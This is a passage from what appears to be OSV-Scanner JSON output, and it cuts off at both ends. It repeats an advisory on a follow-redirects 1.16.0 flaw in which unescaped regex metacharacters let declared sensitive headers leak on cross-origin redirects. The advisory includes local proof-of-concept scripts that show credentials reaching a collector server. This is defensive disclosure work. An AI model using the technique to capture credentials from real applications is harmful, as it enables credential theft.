`X-Token|Secret` -\u003e false, `X-Control-Key` (normal name) -\u003e true, and the split-off `X-Token` -\u003e true and `Secret` -\u003e true (collateral wrong-stripping). The built-ins Authorization, Proxy-Authorization, Cookie all -\u003e true.\n\nSecondary, related weakness (filter snapshot not refreshed after `beforeRedirect`): the filter is built once at construction and applied at `index.js:490`, which runs before the `beforeRedirect(this._options, ...)` hook and the subsequent `_sanitizeOptions` at `index.js:494-506`. Because the strip happens before the hook and `this._headerFilter` is never rebuilt, any entry a caller adds to `options.sensitiveHeaders` inside `beforeRedirect` is silently ignored. This facet is lower severity: mutating `sensitiveHeaders` inside `beforeRedirect` is not a documented usage of the option (the documented path is the request option), so it is best treated as a hardening item bundled with the escaping fix rather than an independent control bypass. It is included here because both issues undermine the same control and share a remediation.\n\nSuggested remediation: two changes close both facets.\n\n1. Escape the complete set of regular-expression metacharacters:\n```js\nfunction escapeRegex(str) { return str.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$\u0026\"); }\n```\nThis was verified to restore correct matching for all affected names while preserving the built-in matches.\n\n2. Build the filter at strip time, or rebuild it after the `beforeRedirect` hook re-sanitizes options, so entries added inside the hook take effect. For example, replace the cached `this._headerFilter` with a `this._getHeaderFilter()` that constructs the RegExp from the current `this._options.sensitiveHeaders` on each redirect.\n\nAdditionally, since header names have a strict grammar, consider validating each entry of `options.sensitiveHeaders` against the RFC 9110 token character set and throwing an explicit error on invalid names, so misconfiguration fails loudly. Add a unit test asserting that every declared name is actually matched by the generated filter; the current suite only exercises metacharacter-free names (`Sensitive-A`, `x-sensitive-b`), which is why the defect passes CI.\n\nReferences:\n- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653\n- https://github.com/follow-redirects/follow-redirects/pull/284\n- https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9\n\n### PoC\nEnvironment: Node.js v24.18.0 on Windows 11. Run each script from a checkout of follow-redirects at 1.16.0 so that `require(\"./index.js\")` resolves to the library under test.\n\nFacet 1, metacharacter header names, `leak.js`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\");\nvar redirector = http.createServer(function (req, res) {\n  req.resume();\n  res.writeHead(302, { Location: \"http://127.0.0.1:45902/\" });   // cross-origin (different port)\n  res.end();\n});\nvar collector = http.createServer(function (req, res) {\n  res.end(JSON.stringify(req.headers));                          // attacker-controlled target\n});\nredirector.listen(45901, \"127.0.0.1\", function () {\n  collector.listen(45902, \"127.0.0.1\", function () {\n    followRedirects.http.request({\n      hostname: \"127.0.0.1\", port: 45901, path: \"/\",\n      headers: {\n        \"X-Api^Key\":      \"SECRET-LEAKED-1\",     // declared sensitive, name contains ^\n        \"X-Token|Secret\": \"SECRET-LEAKED-2\",     // declared sensitive, name contains |\n        \"X-Control-Key\":  \"SHOULD-BE-STRIPPED\",  // declared sensitive, normal name (control)\n        \"Authorization\":  \"Bearer BUILTIN-CTL\"   // built-in list (control)\n      },\n      sensitiveHeaders: [\"X-Api^Key\", \"X-Token|Secret\", \"X-Control-Key\"]\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; });\n      res.on(\"end\", function () {\n        var h = JSON.parse(body);\n        console.log(\"X-Api^Key      :\", h[\"x-api^key\"] || \"(stripped)\");\n        console.log(\"X-Token|Secret :\", h[\"x-token|secret\"] || \"(stripped)\");\n        console.log(\"X-Control-Key  :\", h[\"x-control-key\"] || \"(stripped - OK)\");\n        console.log(\"Authorization  :\", h[\"authorization\"] || \"(stripped - OK)\");\n        redirector.close(); collector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0):\n```\nX-Api^Key      : SECRET-LEAKED-1          \u003c- credential LEAKED to redirect target\nX-Token|Secret : SECRET-LEAKED-2          \u003c- credential LEAKED to redirect target\nX-Control-Key  : (stripped - OK)          \u003c- control: option works for normal names\nAuthorization  : (stripped - OK)          \u003c- control: built-in list works\n```\nThe two controls stripping correctly in the same run prove the strip branch executed and only the metacharacter names defeat the filter.\n\nRoot-cause and fix verification (pure regex logic, no network):\n```js\nvar builtin = [\"Authorization\", \"Proxy-Authorization\", \"Cookie\"];\nfunction escCurrent(s) { return s.replace(/[\\]\\\\/()*+?.$]/g, \"\\\\$\u0026\"); }         // library's escaper\nfunction escFixed(s)   { return s.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$\u0026\"); }      // canonical escaper\nfunction build(esc, d) { return new RegExp(\"^(?:\" + builtin.concat(d).map(esc).join(\"|\") + \")$\", \"i\"); }\nvar declared = [\"X-Api^Key\", \"X-Token|Secret\", \"X-Control-Key\"];\nvar cur = build(escCurrent, declared), fix = build(escFixed, declared);\n[\"X-Api^Key\",\"X-Token|Secret\"].forEach(n =\u003e console.log(\"current\", n, cur.test(n)));  // both false\n[\"X-Api^Key\",\"X-Token|Secret\"].forEach(n =\u003e console.log(\"fixed  \", n, fix.test(n)));  // both true\n[\"X-Token\",\"Secret\"].forEach(n =\u003e console.log(\"collateral\", n, cur.test(n)));         // both true (wrong)\n```\nObserved: current filter returns false for both metacharacter names and true for the unrelated `X-Token` and `Secret`; the fixed filter returns true for all declared names and still true for the built-ins.\n\nReachability of the vectors:\n```\nnode -e 'var http=require(\"http\");[\"X-A^B\",\"X-A|B\",\"X-A[B\",\"X-A{B\",\"X-A}B\"].forEach(function(n){try{var r=http.request({host:\"127.0.0.1\",port:1});r.setHeader(n,\"v\");r.destroy();console.log(n,\"ACCEPTED\");}catch(e){console.log(n,\"REJECTED\",e.code);}});'\n```\nObserved: `X-A^B` and `X-A|B` ACCEPTED; `X-A[B`, `X-A{B`, `X-A}B` REJECTED with `ERR_INVALID_HTTP_TOKEN`.\n\nFacet 2, entry declared inside `beforeRedirect`, `leak2.js`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\");\nvar redirector = http.createServer(function (req, res) {\n  res.writeHead(302, { Location: \"http://127.0.0.1:46202/\" }); res.end();\n});\nvar collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\nredirector.listen(46201, \"127.0.0.1\", function () {\n  collector.listen(46202, \"127.0.0.1\", function () {\n    followRedirects.http.request({\n      hostname: \"127.0.0.1\", port: 46201, path: \"/\",\n      headers: { \"X-Late\": \"LATE-DECLARED-VALUE\" },\n      beforeRedirect: function (options) { options.sensitiveHeaders.push(\"X-Late\"); }\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; }); res.on(\"end\", function () {\n        console.log(\"X-Late forwarded to redirect target:\", JSON.parse(body)[\"x-late\"] || \"(stripped)\");\n        redirector.close(); collector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0): `X-Late forwarded to redirect target: LATE-DECLARED-VALUE` (the late-declared name is not stripped).\n\n### Impact\nThis is an information-disclosure vulnerability: silent failure of the `sensitiveHeaders` cross-origin stripping control for affected header names. Who is impacted: any application, or upstream library, that adopts the `sensitiveHeaders` option to protect a custom credential-bearing header whose name contains `^` or `|`, and that follows a redirect controlled or compromised by an attacker. When triggered, the declared header value (typically an API token or other bearer credential) is disclosed to the attacker-controlled destination, silently, while the application believes the header is protected. As with the array-form finding, if the redirect downgrades HTTPS to HTTP, the credential also transits in cleartext. Downstream exposure extends beyond the library: any application or wrapper that adopts the `sensitiveHeaders` option and declares a metacharacter-bearing header name inherits the same silent bypass. axios delegates redirect handling to follow-redirects (see GHSA-r4q5-vmmm-2653), so axios-based stacks are affected wherever this option reaches the library. The built-in protected headers are unaffected."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-111755](https://osv.dev/CVE-2026-111755)**.\n\n## [GHSA-8r9p-f939-6h3c](https://osv.dev/GHSA-8r9p-f939-6h3c)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e follow-redirects 1.16.0 introduced the `sensitiveHeaders` option (the fix for CVE-2026-40895 / GHSA-r4q5-vmmm-2653), which lets an application declare extra header names that must be removed when a redirect crosses to a different host or downgrades protocol. The filter is a single case-insensitive regular expression built by concatenating the declared header names into an alternation after passing each through `escapeRegex`. `escapeRegex` escapes only a partial set of metacharacters and leaves `^`, `|`, `[`, `{`, and `}` unescaped. Header names may legitimately contain `^` and `|` (both are valid RFC 9110 token characters that Node accepts and sends), and for a declared name containing either, the generated pattern can never match the intended header. As a result, an application that adopts this option to protect a custom credential header, then follows an attacker-controlled cross-origin redirect, forwards that credential to the attacker with no error or warning, while believing it is protected. The failure is silent: the protection simply does not exist for the affected names. The built-in list (Authorization, Proxy-Authorization, Cookie) contains no metacharacters and is not affected by this defect.\n\u003e \n\u003e ### Details\n\u003e The filter is constructed once, in the `RedirectableRequest` constructor at `index.js:118-120`:\n\u003e \n\u003e ```js\n\u003e this._headerFilter = new RegExp(\"^(?:\" +\n\u003e     sensitiveHeaders.concat(options.sensitiveHeaders).map(escapeRegex).join(\"|\") +\n\u003e   \")$\", \"i\");\n\u003e ```\n\u003e \n\u003e `escapeRegex` at `index.js:703-705`:\n\u003e \n\u003e ```js\n\u003e function escapeRegex(regex) {\n\u003e   return regex.replace(/[\\]\\\\/()*+?.$]/g, \"\\\\$\u0026\");   // escapes ] \\ / ( ) * + ? . $  -- NOT ^ | [ { }\n\u003e }\n\u003e ```\n\u003e \n\u003e The character class escapes `]`, `\\`, `/`, `(`, `)`, `*`, `+`, `?`, `.`, and `$`. It omits `^`, `|`, `[`, `{`, and `}`. Of these, Node's `http.ClientRequest` accepts `^` and `|` in header names (they are valid `tchar` values under RFC 9110) and rejects `[`, `{`, `}` with `ERR_INVALID_HTTP_TOKEN`, so `^` and `|` are the reachable vectors for a silent credential leak. Separately, although `[`, `{`, `}` cannot appear as live header names, declaring a `sensitiveHeaders` entry that contains one of them injects an unbalanced token into the alternation (for example an unterminated character class), so the filter `RegExp` throws a `SyntaxError` in the `RedirectableRequest` constructor and the request fails to start. That case is a loud request-time crash from the same incomplete-escaping root cause rather than a silent bypass, and the canonical escaper below fixes it as well.\n\u003e \n\u003e For a declared sensitive header name containing an unescaped metacharacter, the alternation is broken in a fail-open way:\n\u003e \n\u003e - A name containing `^`, for example `X-Api^Key`, yields the alternative `X-Api^Key` inside the pattern. The `^` becomes a mid-pattern start-of-string anchor, so the alternative can never match any real header name. `test(\"X-Api^Key\")` returns `false`, and the header is not stripped.\n\u003e - A name containing `|`, for example `X-Token|Secret`, is split into two separate alternatives `X-Token` and `Secret`. The real header `X-Token|Secret` is never matched (not stripped), while unrelated headers literally named `X-Token` or `Secret` would be stripped instead.\n\u003e \n\u003e The generated filter source, reproduced from the exact library logic, is:\n\u003e ```\n\u003e ^(?:Authorization|Proxy-Authorization|Cookie|X-Api^Key|X-Token|Secret|X-Control-Key)$\n\u003e ```\n\u003e Direct matching results against this filter: `X-Api^Key` -\u003e false, `X-Token|Secret` -\u003e false, `X-Control-Key` (normal name) -\u003e true, and the split-off `X-Token` -\u003e true and `Secret` -\u003e true (collateral wrong-stripping). The built-ins Authorization, Proxy-Authorization, Cookie all -\u003e true.\n\u003e \n\u003e Secondary, related weakness (filter snapshot not refreshed after `beforeRedirect`): the filter is built once at construction and applied at `index.js:490`, which runs before the `beforeRedirect(this._options, ...)` hook and the subsequent `_sanitizeOptions` at `index.js:494-506`. Because the strip happens before the hook and `this._headerFilter` is never rebuilt, any entry a caller adds to `options.sensitiveHeaders` inside `beforeRedirect` is silently ignored. This facet is lower severity: mutating `sensitiveHeaders` inside `beforeRedirect` is not a documented usage of the option (the documented path is the request option), so it is best treated as a hardening item bundled with the escaping fix rather than an independent control bypass. It is included here because both issues undermine the same control and share a remediation.\n\u003e \n\u003e Suggested remediation: two changes close both facets.\n\u003e \n\u003e 1. Escape the complete set of regular-expression metacharacters:\n\u003e ```js\n\u003e function escapeRegex(str) { return str.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$\u0026\"); }\n\u003e ```\n\u003e This was verified to restore correct matching for all affected names while preserving the built-in matches.\n\u003e \n\u003e 2. Build the filter at strip time, or rebuild it after the `beforeRedirect` hook re-sanitizes options, so entries added inside the hook take effect. For example, replace the cached `this._headerFilter` with a `this._getHeaderFilter()` that constructs the RegExp from the current `this._options.sensitiveHeaders` on each redirect.\n\u003e \n\u003e Additionally, since header names have a strict grammar, consider validating each entry of `options.sensitiveHeaders` against the RFC 9110 token character set and throwing an explicit error on invalid names, so misconfiguration fails loudly. Add a unit test asserting that every declared name is actually matched by the generated filter; the current suite only exercises metacharacter-free names (`Sensitive-A`, `x-sensitive-b`), which is why the defect passes CI.\n\u003e \n\u003e References:\n\u003e - https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653\n\u003e - https://github.com/follow-redirects/follow-redirects/pull/284\n\u003e - https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9\n\u003e \n\u003e ### PoC\n\u003e Environment: Node.js v24.18.0 on Windows 11. Run each script from a checkout of follow-redirects at 1.16.0 so that `require(\"./index.js\")` resolves to the library under test.\n\u003e \n\u003e Facet 1, metacharacter header names, `leak.js`:\n\u003e ```js\n\u003e var followRedirects = require(\"./index.js\");\n\u003e var http = require(\"http\");\n\u003e var redirector = http.createServer(function (req, res) {\n\u003e   req.resume();\n\u003e   res.writeHead(302, { Location: \"http://127.0.0.1:45902/\" });   // cross-origin (different port)\n\u003e   res.end();\n\u003e });\n\u003e var collector = http.createServer(function (req, res) {\n\u003e   res.end(JSON.stringify(req.headers));                          // attacker-controlled target\n\u003e });\n\u003e redirector.listen(45901, \"127.0.0.1\", function () {\n\u003e   collector.listen(45902, \"127.0.0.1\", function () {\n\u003e     followRedirects.http.request({\n\u003e       hostname: \"127.0.0.1\", port: 45901, path: \"/\",\n\u003e       headers: {\n\u003e         \"X-Api^Key\":      \"SECRET-LEAKED-1\",     // declared sensitive, name contains ^\n\u003e         \"X-Token|Secret\": \"SECRET-LEAKED-2\",     // declared sensitive, name contains |\n\u003e         \"X-Control-Key\":  \"SHOULD-BE-STRIPPED\",  // declared sensitive, normal name (control)\n\u003e         \"Authorization\":  \"Bearer BUILTIN-CTL\"   // built-in list (control)\n\u003e       },\n\u003e       sensitiveHeaders: [\"X-Api^Key\", \"X-Token|Secret\", \"X-Control-Key\"]\n\u003e     }, function (res) {\n\u003e       var body = \"\"; res.on(\"data\", function (c) { body += c; });\n\u003e       res.on(\"end\", function () {\n\u003e         var h = JSON.parse(body);\n\u003e         console.log(\"X-Api^Key      :\", h[\"x-api^key\"] || \"(stripped)\");\n\u003e         console.log(\"X-Token|Secret :\", h[\"x-token|secret\"] || \"(stripped)\");\n\u003e         console.log(\"X-Control-Key  :\", h[\"x-control-key\"] || \"(stripped - OK)\");\n\u003e         console.log(\"Authorization  :\", h[\"authorization\"] || \"(stripped - OK)\");\n\u003e         redirector.close(); collector.close();\n\u003e       });\n\u003e     }).end();\n\u003e   });\n\u003e });\n\u003e ```\n\u003e Observed output (1.16.0):\n\u003e ```\n\u003e X-Api^Key      : SECRET-LEAKED-1          \u003c- credential LEAKED to redirect target\n\u003e X-Token|Secret : SECRET-LEAKED-2          \u003c- credential LEAKED to redirect target\n\u003e X-Control-Key  : (stripped - OK)          \u003c- control: option works for normal names\n\u003e Authorization  : (stripped - OK)          \u003c- control: built-in list works\n\u003e ```\n\u003e The two controls stripping correctly in the same run prove the strip branch executed and only the metacharacter names defeat the filter.\n\u003e \n\u003e Root-cause and fix verification (pure regex logic, no network):\n\u003e ```js\n\u003e var builtin = [\"Authorization\", \"Proxy-Authorization\", \"Cookie\"];\n\u003e function escCurrent(s) { return s.replace(/[\\]\\\\/()*+?.$]/g, \"\\\\$\u0026\"); }         // library's escaper\n\u003e function escFixed(s)   { return s.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$\u0026\"); }      // canonical escaper\n\u003e function build(esc, d) { return new RegExp(\"^(?:\" + builtin.concat(d).map(esc).join(\"|\") + \")$\", \"i\"); }\n\u003e var declared = [\"X-Api^Key\", \"X-Token|Secret\", \"X-Control-Key\"];\n\u003e var cur = build(escCurrent, declared), fix = build(escFixed, declared);\n\u003e [\"X-Api^Key\",\"X-Token|Secret\"].forEach(n =\u003e console.log(\"current\", n, cur.test(n)));  // both false\n\u003e [\"X-Api^Key\",\"X-Token|Secret\"].forEach(n =\u003e console.log(\"fixed  \", n, fix.test(n)));  // both true\n\u003e [\"X-Token\",\"Secret\"].forEach(n =\u003e console.log(\"collateral\", n, cur.test(n)));         // both true (wrong)\n\u003e ```\n\u003e Observed: current filter returns false for both metacharacter names and true for the unrelated `X-Token` and `Secret`; the fixed filter returns true for all declared names and still true for the built-ins.\n\u003e \n\u003e Reachability of the vectors:\n\u003e ```\n\u003e node -e 'var http=require(\"http\");[\"X-A^B\",\"X-A|B\",\"X-A[B\",\"X-A{B\",\"X-A}B\"].forEach(function(n){try{var r=http.request({host:\"127.0.0.1\",port:1});r.setHeader(n,\"v\");r.destroy();console.log(n,\"ACCEPTED\");}catch(e){console.log(n,\"REJECTED\",e.code);}});'\n\u003e ```\n\u003e Observed: `X-A^B` and `X-A|B` ACCEPTED; `X-A[B`, `X-A{B`, `X-A}B` REJECTED with `ERR_INVALID_HTTP_TOKEN`.\n\u003e \n\u003e Facet 2, entry declared inside `beforeRedirect`, `leak2.js`:\n\u003e ```js\n\u003e var followRedirects = require(\"./index.js\");\n\u003e var http = require(\"http\");\n\u003e var redirector = http.createServer(function (req, res) {\n\u003e   res.writeHead(302, { Location: \"http://127.0.0.1:46202/\" }); res.end();\n\u003e });\n\u003e var collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\n\u003e redirector.listen(46201, \"127.0.0.1\", function () {\n\u003e   collector.listen(46202, \"127.0.0.1\", function () {\n\u003e     followRedirects.http.request({\n\u003e       hostname: \"127.0.0.1\", port: 46201, path: \"/\",\n\u003e       headers: { \"X-Late\": \"LATE-DECLARED-VALUE\" },\n\u003e       beforeRedirect: function (options) { options.sensitiveHeaders.push(\"X-Late\"); }\n\u003e     }, function (res) {\n\u003e       var body = \"\"; res.on(\"data\", function (c) { body += c; }); res.on(\"end\", function () {\n\u003e         console.log(\"X-Late forwarded to redirect target:\", JSON.parse(body)[\"x-late\"] || \"(stripped)\");\n\u003e         redirector.close(); collector.close();\n\u003e       });\n\u003e     }).end();\n\u003e   });\n\u003e });\n\u003e ```\n\u003e Observed output (1.16.0): `X-Late forwarded to redirect target: LATE-DECLARED-VALUE` (the late-declared name is not stripped).\n\u003e \n\u003e ### Impact\n\u003e This is an information-disclosure vulnerability: silent failure of the `sensitiveHeaders` cross-origin stripping control for affected header names. Who is impacted: any application, or upstream library, that adopts the `sensitiveHeaders` option to protect a custom credential-bearing header whose name contains `^` or `|`, and that follows a redirect controlled or compromised by an attacker. When triggered, the declared header value (typically an API token or other bearer credential) is disclosed to the attacker-controlled destination, silently, while the application believes the header is protected. As with the array-form finding, if the redirect downgrades HTTPS to HTTP, the credential also transits in cleartext. Downstream exposure extends beyond the library: any application or wrapper that adopts the `sensitiveHeaders` option and declares a metacharacter-bearing header name inherits the same silent bypass. axios delegates redirect handling to follow-redirects (see GHSA-r4q5-vmmm-2653), so axios-based stacks are affected wherever this option reaches the library. The built-in protected headers are unaffected.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | follow-redirects | 1.16.0 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | follow-redirects | 1.16.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-8r9p-f939-6h3c | follow-redirects | 1.16.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-111755\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-111755\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-111755](https://osv.dev/CVE-2026-111755)**.\n\n## [GHSA-8r9p-f939-6h3c](https://osv.dev/GHSA-8r9p-f939-6h3c)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e follow-redirects 1.16.0 introduced the `sensitiveHeaders` option (the fix for CVE-2026-40895 / GHSA-r4q5-vmmm-2653), which lets an application declare extra header names that must be removed when a redirect crosses to a different host or downgrades protocol. The filter is a single case-insensitive regular expression built by concatenating the declared header names into an alternation after passing each through `escapeRegex`. `escapeRegex` escapes only a partial set of metacharacters and leaves `^`, `|`, `[`, `{`, and `}` unescaped. Header names may legitimately contain `^` and `|` (both are valid RFC 9110 token characters that Node accepts and sends), and for a declared name containing either, the generated pattern can never match the intended header. As a result, an application that adopts this option to protect a custom credential header, then follows an attacker-controlled cross-origin redirect, forwards that credential to the attacker with no error or warning, while believing it is protected. The failure is silent: the protection simply does not exist for the affected names. The built-in list (Authorization, Proxy-Authorization, Cookie) contains no metacharacters and is not affected by this defect.\n\u003e \n\u003e ### Details\n\u003e The filter is constructed once, in the `RedirectableRequest` constructor at `index.js:118-120`:\n\u003e \n\u003e ```js\n\u003e this._headerFilter = new RegExp(\"^(?:\" +\n\u003e     sensitiveHeaders.concat(options.sensitiveHeaders).map(escapeRegex).join(\"|\") +\n\u003e   \")$\", \"i\");\n\u003e ```\n\u003e \n\u003e `escapeRegex` at `index.js:703-705`:\n\u003e \n\u003e ```js\n\u003e function escapeRegex(regex) {\n\u003e   return regex.replace(/[\\]\\\\/()*+?.$]/g, \"\\\\$\u0026\");   // escapes ] \\ / ( ) * + ? . $  -- NOT ^ | [ { }\n\u003e }\n\u003e ```\n\u003e \n\u003e The character class escapes `]`, `\\`, `/`, `(`, `)`, `*`, `+`, `?`, `.`, and `$`. It omits `^`, `|`, `[`, `{`, and `}`. Of these, Node's `http.ClientRequest` accepts `^` and `|` in header names (they are valid `tchar` values under RFC 9110) and rejects `[`, `{`, `}` with `ERR_INVALID_HTTP_TOKEN`, so `^` and `|` are the reachable vectors for a silent credential leak. Separately, although `[`, `{`, `}` cannot appear as live header names, declaring a `sensitiveHeaders` entry that contains one of them injects an unbalanced token into the alternation (for example an unterminated character class), so the filter `RegExp` throws a `SyntaxError` in the `RedirectableRequest` constructor and the request fails to start. That case is a loud request-time crash from the same incomplete-escaping root cause rather than a silent bypass, and the canonical escaper below fixes it as well.\n\u003e \n\u003e For a declared sensitive header name containing an unescaped metacharacter, the alternation is broken in a fail-open way:\n\u003e \n\u003e - A name containing `^`, for example `X-Api^Key`, yields the alternative `X-Api^Key` inside the pattern. The `^` becomes a mid-pattern start-of-string anchor, so the alternative can never match any real header name. `test(\"X-Api^Key\")` returns `false`, and the header is not stripped.\n\u003e - A name containing `|`, for example `X-Token|Secret`, is split into two separate alternatives `X-Token` and `Secret`. The real header `X-Token|Secret` is never matched (not stripped), while unrelated headers literally named `X-Token` or `Secret` would be stripped instead.\n\u003e \n\u003e The generated filter source, reproduced from the exact library logic, is:\n\u003e ```\n\u003e ^(?:Authorization|Proxy-Authorization|Cookie|X-Api^Key|X-Token|Secret|X-Control-Key)$\n\u003e ```\n\u003e Direct matching results against this filter: `X-Api^Key` -\u003e false, `X-Token|Secret` -\u003e false, `X-Control-Key` (normal name) -\u003e true, and the split-off `X-Token` -\u003e true and `Secret` -\u003e true (collateral wrong-stripping). The built-ins Authorization, Proxy-Authorization, Cookie all -\u003e true.\n\u003e \n\u003e Secondary, related weakness (filter snapshot not refreshed after `beforeRedirect`): the filter is built once at construction and applied at `index.js:490`, which runs before the `beforeRedirect(this._options, ...)` hook and the subsequent `_sanitizeOptions` at `index.js:494-506`. Because the strip happens before the hook and `this._headerFilter` is never rebuilt, any entry a caller adds to `options.sensitiveHeaders` inside `beforeRedirect` is silently ignored. This facet is lower severity: mutating `sensitiveHeaders` inside `beforeRedirect` is not a documented usage of the option (the documented path is the request option), so it is best treated as a hardening item bundled with the escaping fix rather than an independent control bypass. It is included here because both issues undermine the same control and share a remediation.\n\u003e \n\u003e Suggested remediation: two changes close both facets.\n\u003e \n\u003e 1. Escape the complete set of regular-expression metacharacters:\n\u003e ```js\n\u003e function escapeRegex(str) { return str.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$\u0026\"); }\n\u003e ```\n\u003e This was verified to restore correct matching for all affected names while preserving the built-in matches.\n\u003e \n\u003e 2. Build the filter at strip time, or rebuild it after the `beforeRedirect` hook re-sanitizes options, so entries added inside the hook take effect. For example, replace the cached `this._headerFilter` with a `this._getHeaderFilter()` that constructs the RegExp from the current `this._options.sensitiveHeaders` on each redirect.\n\u003e \n\u003e Additionally, since header names have a strict grammar, consider validating each entry of `options.sensitiveHeaders` against the RFC 9110 token character set and throwing an explicit error on invalid names, so misconfiguration fails loudly. Add a unit test asserting that every declared name is actually matched by the generated filter; the current suite only exercises metacharacter-free names (`Sensitive-A`, `x-sensitive-b`), which is why the defect passes CI.\n\u003e \n\u003e References:\n\u003e - https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653\n\u003e - https://github.com/follow-redirects/follow-redirects/pull/284\n\u003e - https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9\n\u003e \n\u003e ### PoC\n\u003e Environment: Node.js v24.18.0 on Windows 11. Run each script from a checkout of follow-redirects at 1.16.0 so that `require(\"./index.js\")` resolves to the library under test.\n\u003e \n\u003e Facet 1, metacharacter header names, `leak.js`:\n\u003e ```js\n\u003e var followRedirects = require(\"./index.js\");\n\u003e var http = require(\"http\");\n\u003e var redirector = http.createServer(function (req, res) {\n\u003e   req.resume();\n\u003e   res.writeHead(302, { Location: \"http://127.0.0.1:45902/\" });   // cross-origin (different port)\n\u003e   res.end();\n\u003e });\n\u003e var collector = http.createServer(function (req, res) {\n\u003e   res.end(JSON.stringify(req.headers));                          // attacker-controlled target\n\u003e });\n\u003e redirector.listen(45901, \"127.0.0.1\", function () {\n\u003e   collector.listen(45902, \"127.0.0.1\", function () {\n\u003e     followRedirects.http.request({\n\u003e       hostname: \"127.0.0.1\", port: 45901, path: \"/\",\n\u003e       headers: {\n\u003e         \"X-Api^Key\":      \"SECRET-LEAKED-1\",     // declared sensitive, name contains ^\n\u003e         \"X-Token|Secret\": \"SECRET-LEAKED-2\",     // declared sensitive, name contains |\n\u003e         \"X-Control-Key\":  \"SHOULD-BE-STRIPPED\",  // declared sensitive, normal name (control)\n\u003e         \"Authorization\":  \"Bearer BUILTIN-CTL\"   // built-in list (control)\n\u003e       },\n\u003e       sensitiveHeaders: [\"X-Api^Key\", \"X-Token|Secret\", \"X-Control-Key\"]\n\u003e     }, function (res) {\n\u003e       var body = \"\"; res.on(\"data\", function (c) { body += c; });\n\u003e       res.on(\"end\", function () {\n\u003e         var h = JSON.parse(body);\n\u003e         console.log(\"X-Api^Key      :\", h[\"x-api^key\"] || \"(stripped)\");\n\u003e         console.log(\"X-Token|Secret :\", h[\"x-token|secret\"] || \"(stripped)\");\n\u003e         console.log(\"X-Control-Key  :\", h[\"x-control-key\"] || \"(stripped - OK)\");\n\u003e         console.log(\"Authorization  :\", h[\"authorization\"] || \"(stripped - OK)\");\n\u003e         redirector.close(); collector.close();\n\u003e       });\n\u003e     }).end();\n\u003e   });\n\u003e });\n\u003e ```\n\u003e Observed output (1.16.0):\n\u003e ```\n\u003e X-Api^Key      : SECRET-LEAKED-1          \u003c- credential LEAKED to redirect target\n\u003e X-Token|Secret : SECRET-LEAKED-2          \u003c- credential LEAKED to redirect target\n\u003e X-Control-Key  : (stripped - OK)          \u003c- control: option works for normal names\n\u003e Authorization  : (stripped - OK)          \u003c- control: built-in list works\n\u003e ```\n\u003e The two controls stripping correctly in the same run prove the strip branch executed and only the metacharacter names defeat the filter.\n\u003e \n\u003e Root-cause and fix verification (pure regex logic, no network):\n\u003e ```js\n\u003e var builtin = [\"Authorization\", \"Proxy-Authorization\", \"Cookie\"];\n\u003e function escCurrent(s) { return s.replace(/[\\]\\\\/()*+?.$]/g, \"\\\\$\u0026\"); }         // library's escaper\n\u003e function escFixed(s)   { return s.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$\u0026\"); }      // canonical escaper\n\u003e function build(esc, d) { return new RegExp(\"^(?:\" + builtin.concat(d).map(esc).join(\"|\") + \")$\", \"i\"); }\n\u003e var declared = [\"X-Api^Key\", \"X-Token|Secret\", \"X-Control-Key\"];\n\u003e var cur = build(escCurrent, declared), fix = build(escFixed, declared);\n\u003e [\"X-Api^Key\",\"X-Token|Secret\"].forEach(n =\u003e console.log(\"current\", n, cur.test(n)));  // both false\n\u003e [\"X-Api^Key\",\"X-Token|Secret\"].forEach(n =\u003e console.log(\"fixed  \", n, fix.test(n)));  // both true\n\u003e [\"X-Token\",\"Secret\"].forEach(n =\u003e console.log(\"collateral\", n, cur.test(n)));         // both true (wrong)\n\u003e ```\n\u003e Observed: current filter returns false for both metacharacter names and true for the unrelated `X-Token` and `Secret`; the fixed filter returns true for all declared names and still 